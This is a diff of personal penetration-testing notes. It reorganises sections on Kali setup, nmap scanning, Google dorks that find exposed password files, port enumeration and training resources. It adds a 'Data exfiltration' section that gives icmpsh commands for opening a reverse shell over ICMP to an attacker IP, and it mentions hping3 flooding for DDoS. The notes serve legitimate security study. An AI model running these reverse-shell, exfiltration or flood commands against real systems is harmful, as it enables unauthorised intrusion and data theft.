@@ -1,5 +1,5 @@
 # Kali setup
-### Share with host machine
+## Share with host machine
 In virtual box
 
  - Select the kali machine
@@ -33,40 +33,12 @@ Firefox plugin
 Used to reuse fetched auth / session cookies  
 https://addons.mozilla.org/fr/firefox/addon/a-cookie-manager/
 
-## flameshot (screenshot)
-### Install
-
-    apt install flameshot
-### Configuration
-
- - Open flameshot from the menu
-	 - This should open the flameshot trail icon (a flame - top right of the screen)
- - Right-click on it and select "Configuration"
- - Go to the "General" tab
- - Set "Save Path" to `/kali-share/screenshots`
- - Check "Use fixed path for screenshots to save
- - Preferred save file extension `jpeg`
-
-
-### Keyboard shortcuts
-In kali
-
- - Open the menu
- - Type "keyboard"
- - Open the "Keyboard" application
- - Select the "Application Shortcuts" tab
-
-Shortcut "Print": `flameshot gui -s`  
-Shortcut "Shift+Print": `flameshot gui`
-
 ## Docker
 
 ### Install
 https://www.kali.org/docs/containers/installing-docker-on-kali/
 
 To install Docker on Kali you need to remember that there is already a package named “docker”, therefore Docker has to be installed under a different name. If you install docker you will not end up with the container version. The version we will be installing is named docker.io. All commands are the same however, so running docker on the command line will be the appropriate command.
-
-
 
 
 ## Dradis CE
@@ -127,21 +99,72 @@ https://dradisframework.com/ce/documentation/reset.html
 
     cd ~/dradis-ce/
     bundle exec thor dradis:reset
-    
+
+## flameshot (screenshot)
+### Install
+
+    apt install flameshot
+### Configuration
+
+- Open flameshot from the menu
+    - This should open the flameshot trail icon (a flame - top right of the screen)
+- Right-click on it and select "Configuration"
+- Go to the "General" tab
+- Set "Save Path" to `/kali-share/screenshots`
+- Check "Use fixed path for screenshots to save
+- Preferred save file extension `jpeg`
 
 
-# Information gathering
-## Misc
+### Keyboard shortcuts
+In kali
 
-  - https://gchq.github.io/CyberChef/ - The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis
-  - https://beefproject.com/ - BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.
+- Open the menu
+- Type "keyboard"
+- Open the "Keyboard" application
+- Select the "Application Shortcuts" tab
 
+Shortcut "Print": `flameshot gui -s`  
+Shortcut "Shift+Print": `flameshot gui`
+
+## Immunity debugger
+https://immunityinc.com/products/debugger/
+
+# Pentest
 ## Frameworks
 
-  - https://attack.mitre.org/
-  - https://owasp.org/
+- https://attack.mitre.org/
+- https://owasp.org/
 
-## Google Hacks / dorks
+## Phases
+
+  - Pre-engagement
+  - Interactions
+  - Intelligence Gathering
+  - Threat Modeling
+  - Vulnerability Analysis
+  - Exploitation
+  - Post Exploitation
+  - Reporting
+
+## Pre-engagement
+
+Write an agreement (out of prison card)
+
+  - Scope
+  - Timeframe
+
+Separate
+  - Ransomeware
+  - DDoS
+  - Social engineering
+
+## Intelligence gathering
+
+### Tools
+
+See [tools page](./tools/tools.md)
+
+### Google Hacks / dorks
   - camera linksys inurl:main.cgi
   - intitle:"toshiba network camera - User login"
   - ext:php
@@ -150,40 +173,51 @@ https://dradisframework.com/ce/documentation/reset.html
   - ext:pwd inurl:(service|authors|administrators|users) "# - Frontpage"
   - intitle:"index of /" password.txt
 
-## Knowledge databases
+### Knowledge databases
   - https://www.exploit-db.com/ - Exploit DB
   - https://www.mend.io/vulnerability-database/ - Vulns DB
   - https://cve.mitre.org/data/refs/refmap/source-OSVDB.html - OSVDB to CVE
   - https://www.shodan.io/ - Connected devices
 
-## Reporting
-
-https://pentestreports.com/
-
-## Scan
+### Scan
 > Jackpot if these ports are open: 21, 80, 139, 445
 
 Commands:
   - nmap
-  - hping3 - nmap with traceroute, DDoS with `--flood`
-### Export
+  - hping3 - nmap with traceroute
+    - DDoS with `--flood`
+#### Export (for dradis)
 
-    nmap -sV -oX - <ip> >> /kali-share/nmap-<ip>.xml
+    nmap -sV -oX - <ip> > /kali-share/nmap-<ip>.xml
     
-### Vulnerability scan
+#### Vulnerability scan
 
     nmap -v --script vuln <ip>
     
-### Auth scan
+#### Auth scan
 
     nmap -v --script auth <ip>
 
-## Ports
-### FTP - 21
+#### Noisy scan
+
+    nmap -p- -sV -T4 <ip>
+
+  - `-p-` all ports
+  - `-T4` set timing template
+    - paranoid (0)
+    - sneaky (1)
+    - polite (2)
+    - normal (3)
+    - aggressive (4)
+    - insane (5)
+  - `-sV` get service versions
+
+### Ports
+#### FTP - 21
 
     nc <ip> 21
 
-### HTTP - 80
+#### HTTP - 80
 
 Commands:
   - dirb
@@ -193,151 +227,25 @@ Tools:
   - burpsuite
   - dirbuster
 
-##### burpsuite
-https://www.kali.org/tools/burpsuite/
-
-Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application’s attack surface, through to finding and exploiting security vulnerabilities.
-
-Burp gives you full control, letting you combine advanced manual techniques with state-of-the-art automation, to make your work faster, more effective, and more fun.
-
-##### dirb
-Scan available pages
-https://www.hackingarticles.in/comprehensive-guide-on-dirb-tool/
-
-    dirb http://<ip> <opt:wordlist>
-
-options:
-  - `-z`: Add a milliseconds delay to not cause excessive Flood.
-	
-wordlists: 
-  - /usr/share/dirb/wordlist/vulns/...
-  - /usr/share/dirb/wordlists/big.txt
-
-##### dirbuster
-https://www.kali.org/tools/dirbuster/
-
-DirBuster is a multi threaded java application designed to brute force directories and files names on web/application servers. Often is the case now of what looks like a web server in a state of default installation is actually not, and has pages and applications hidden within. DirBuster attempts to find these.
-
-However tools of this nature are often as only good as the directory and file list they come with. A different approach was taken to generating this. The list was generated from scratch, by crawling the Internet and collecting the directory and files that are actually used by developers! DirBuster comes a total of 9 different lists, this makes DirBuster extremely effective at finding those hidden files and directories. And if that was not enough DirBuster also has the option to perform a pure brute force, which leaves the hidden directories and files nowhere to hide.
-
-##### nikto
-Gives vulnerabilities
-	
-    nikto -h http://<ip>:<port>
-
-#### Export
-
-    nikto -h http://<ip>:<port> -o '/kali-share/nikto-<ip>-<port>.xml' -Format xml
-    dirb http://<ip>:<port> >> /kali-share/dirb-<ip>-<port>.txt
-
-Check if you find the following
-
- - phpinfo
- - system requirements
- - software (i.e. twiki)
-
-### MiniServ (Webmin) - 10000, 20000
+#### MiniServ (Webmin) - 10000, 20000
 Go to `https://<ip>:10000/`
 
-### NETBIOS-SSN / SMB - 139, 445
+#### NETBIOS-SSN / SMB - 139, 445
 
     enum4linux -a <ip> >> /kali-share/enum4linux-<ip>.txt
 
-### SNMP (Simple Noetwork Management Protocol) - UDP 161, UDP 162
+#### SNMP (Simple Noetwork Management Protocol) - UDP 161, UDP 162
 	
     onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <ip>
     snmpwalk -c public <ip> -v1
     snmpset
 
-# Metasploit framework
+## Reporting
 
-Open metasploitable framework
-## Getting started
-https://www.section.io/engineering-education/getting-started-with-metasploit-framework/  
-https://www.offensive-security.com/metasploit-unleashed/using-databases/  
-https://docs.rapid7.com/metasploit/exporting-and-importing-data/
-## Start
-
-    msfconsole
-## Workspace
-### See workspaces
-
-    workspace
-
-### Add workspace
-
-    workspace -a <workspace-name>
-
-### Change workspace
-
-    workspace <workspace-name>
-
-## Scanning
-This will add the remote machine to hosts
-
-    db_nmap -A <ip>
-Useful to set RHOSTS of exploits rapidly
-## Search
-    search <terms>
-
-## Exploit
-### set RHOSTS
-
-    hosts -R
-## Vulnerabilities
-Displays the vulnerabilities exploited
-
-    vulns
-## Credentials
-
-    creds
-## Loot
-
-    loot
-
-## Import module
-Copy file to ~/.msf4/modules/exploits
-
-    sudo updatedb
-Restart metasploit-framework
-
-## Export database
-
-    db_export -f xml -a /kali-share/metasploit-framework.xml
+https://pentestreports.com/
 
 # Training
-## Virtual machines
-https://www.vulnhub.com/
-
-  - Metasploitable: 1
-    - Difficulty: Easy
-    - Type: Exploit
-    - https://www.vulnhub.com/entry/metasploitable-1,28/
-  - Metasploitable: 2
-    - Difficulty: Easy
-    - Type: Exploit
-    - https://www.vulnhub.com/entry/metasploitable-2,29/
-  - Empire: Breakout
-    - Difficulty: Medium/hard?
-    - Type: Escape room
-    - https://www.vulnhub.com/entry/empire-breakout,751/
-  - MR-ROBOT: 1
-    - Difficulty: ?
-    - https://www.vulnhub.com/entry/mr-robot-1,151/
-    
-## Docker
-
-  - OWASP - Juice Shop
-    - Type: Docker web application (also available with sources)
-    - https://hub.docker.com/r/bkimminich/juice-shop
-    - Install: https://github.com/juice-shop/juice-shop#docker-container
-
-## Software
-
-  - OWASP - Juice Shop
-    - Type: Web application (also available with docker)
-    - https://owasp.org/www-project-juice-shop/
-    - Install: https://github.com/juice-shop/juice-shop#from-sources
+See the [training page](./training/training.md)
 
 # Attacks
 ## Xmas attack
@@ -437,10 +345,58 @@ Options:
 Needs to know which web application language the web server supports
  - `--sql-shell` Prompt for an interactive SQL shell
 
+# Data exfiltration
+## ICMP - Internet Control Message Protocol
+
+**Goal:** Extract data through the ICM protocol  
+**How:** Using impacket and icmpsh
+
+ICMP is a protocol intented to be lightweight (small messages)  
+Impacket helps chunk data to extract them using icmpsh  
+icmpsh makes a reversal shell between target and attacker
+
+### Tools
+
+Install python-pip
+
+    sudo apt install python3-pip
+
+Install impacket
+
+    sudo git clone https://github.com/SecureAuthCorp/impacket.git
+    sudo pip3 install -r /<git cloning path>/impacket/requirements.txt
+    sudo python3 /<git cloning path>/impacket/setup.py install
+
+Install icmpsh
+
+    sudo git clone https://github.com/bdamele/icmpsh.git
+    cd icmpsh
+
+Insert in `/etc/sysctl.conf`
+
+    net.ipv4.icmp_echo_ignore_all=1
+
+
+### Usage
+#### Attacker machine
+
+    sudo ./icmpsh_m.py <attacker-ip> <target-ip>
+
+#### Target machine
+
+You need to upload a icmpsh tool on the target machine first
+
+##### Send test  
+
+    icmpsh.exe -t <attacker-ip> -r
+
+##### Open reversal
+    icmpsh.exe -t <attacker-ip>
+
 # Lexical
 ## Samba
 Search also: smb
 
 # Learning
 
-https://github.com/phr85/swiss-cyber-defence/tree/main/Courses/Offensive%20Security%20-%20Penetrations%20Testing%20Bootcamp
+  - [Offensive Security - Penetrations Testing Bootcamp](https://github.com/phr85/swiss-cyber-defence/tree/main/Courses/Offensive%20Security%20-%20Penetrations%20Testing%20Bootcamp)
